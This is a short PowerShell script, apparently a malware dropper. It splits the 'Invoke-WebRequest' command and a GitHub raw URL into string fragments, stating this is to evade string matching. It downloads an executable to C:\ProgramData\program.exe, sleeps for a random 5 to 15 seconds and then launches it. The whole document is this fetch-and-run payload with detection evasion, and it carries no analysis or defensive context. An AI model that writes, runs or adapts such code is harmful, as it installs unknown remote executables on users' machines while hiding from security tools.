# Obfuscated script to avoid direct string matching
$frag1 = 'I' + 'nv' + 'oke' + '-' + 'We' + 'bR' + 'equest'
$frag2 = '-U' + 'ri'
$frag3 = 'https://' + 'gith' + 'ub.com/' + 'flo' + 'orso' + 'folga' + '-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe'
$frag4 = '-OutFile'
$frag5 = 'C:\ProgramData\program.exe'
& $frag1 $frag2 $frag3 $frag4 $frag5  # Reconstruct and execute

$randDelay = [Math]::Abs((Get-Random) % 10) + 5  # Random delay 5-15 seconds
Start-Sleep -Seconds $randDelay

$procStart = 'Start-Process'
& $procStart $frag5
